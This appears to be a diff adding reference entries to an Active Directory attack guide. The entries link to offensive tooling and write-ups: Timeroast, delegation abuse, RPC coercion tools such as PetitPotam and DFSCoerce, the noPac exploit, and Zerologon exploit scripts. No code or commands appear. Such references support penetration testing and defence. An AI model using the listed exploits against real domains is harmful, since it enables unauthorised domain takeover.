 21. SecuraBV, Timeroast. [https://github.com/SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
 	The reference implementation behind the timeroast.py command referenced in this section.
+22. The Hacker Recipes, "(KCD) Constrained." [https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
+	The source for the classic constrained delegation section, including the protocol-transition distinction and the RBCD fallback for delegation without it.
+23. snovvcrash, "Abusing KCD Without Protocol Transition." [https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html](https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html)
+	Detail on the RBCD-fallback path referenced in the constrained delegation section.
+24. The Hacker Recipes, "MS-RPRN (PrinterBug)." [https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/rpc-coercions/ms-rprn](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/rpc-coercions/ms-rprn)
+	One of the four RPC coercion primitives named in the coercion-to-RBCD-relay section; the same directory covers MS-EFSRPC, MS-DFSNM, and MS-FSRVP.
+25. topotam, PetitPotam. [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
+	MS-EFSRPC coercion, also referenced in the unconstrained delegation section.
+26. Wh04m1001, DFSCoerce. [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
+	MS-DFSNM coercion, referenced as part of the coercion family in the RBCD relay section.
+27. ShutdownRepo, ShadowCoerce. [https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
+	MS-FSRVP coercion, referenced as part of the coercion family in the RBCD relay section.
+28. Ridter, noPac. [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
+	The tool referenced in the NoPac command block, chaining CVE-2021-42278 and CVE-2021-42287.
+29. Microsoft Security Response Center, "Security Update Guide: CVE-2021-42287" and "CVE-2021-42278." [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) / [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
+	The two advisories behind the NoPac section, patched together by KB5008380.
+30. The Hacker Recipes, "ZeroLogon." [https://www.thehacker.recipes/ad/movement/netlogon/zerologon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon)
+	The source for the Zerologon mechanics, including the disruptive and relay-based exploitation paths referenced in this section.
+31. Tom Tervoort, Secura, "Zerologon: Instantly Become Domain Admin." [https://www.secura.com/blog/zero-logon](https://www.secura.com/blog/zero-logon)
+	The original disclosure of CVE-2020-1472.
+32. Dirk-jan Mollema, CVE-2020-1472 exploit and restore scripts. [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+	The exploit and restore tooling referenced in the Zerologon command block, and the source of the non-disruptive relay-to-DCSync variant.
